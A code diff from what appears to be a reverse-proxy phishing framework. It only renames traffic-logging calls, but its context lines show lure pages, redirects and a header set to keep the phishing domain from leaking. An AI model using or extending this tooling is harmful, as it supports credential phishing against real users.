@@ -351,7 +351,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 											if resp != nil {
-												LogResponse(resp) //send to trafficlogger
+												LogIncoming(resp) //send to trafficlogger
 												return req, resp
 											} else {
 												log.Error("lure: failed to create html template response")
@@ -379,7 +379,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 						if resp != nil {
 							resp.Header.Add("Location", rurl)
-							LogResponse(resp) //send to trafficlogger
+							LogIncoming(resp) //send to trafficlogger
 							return req, resp
 						}
 					}
@@ -391,7 +391,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
 					if resp != nil {
-						LogResponse(resp) //send to trafficlogger
+						LogInvalidResp(resp) //send to trafficlogger
 						return req, resp
 					}
 				}
@@ -610,7 +610,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				p.cantFindMe(req, e_host)
 			}
 
-			LogRequest(req) //send to trafficlogger
+			LogInvalid(req) //send to trafficlogger
 			return req, nil
 		})
 
@@ -902,7 +902,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								// avoid leaking the phishing domain via the Referrer header
 								resp.Header.Set("Referrer-Policy", "no-referrer")
 								resp.Header.Set("Location", s.RedirectURL)
-								LogResponse(resp) //send to trafficlogger
+								LogIncoming(resp) //send to trafficlogger
 								return resp
 							}
 						}
@@ -910,7 +910,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			LogResponse(resp) //send to trafficlogger
+			LogIncoming(resp) //send to trafficlogger
 			return resp
 		})
 
@@ -928,17 +928,17 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 		if resp != nil {
 			resp.Header.Add("Location", redirect_url)
-			LogResponse(resp) //send to trafficlogger
+			LogInvalidResp(resp) //send to trafficlogger
 			return req, resp
 		}
 	} else {
 		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
 		if resp != nil {
-			LogResponse(resp) //send to trafficlogger
+			LogInvalidResp(resp) //send to trafficlogger
 			return req, resp
 		}
 	}
-	LogRequest(req) //send to trafficlogger
+	LogInvalid(req) //send to trafficlogger
 	return req, nil
 }
 
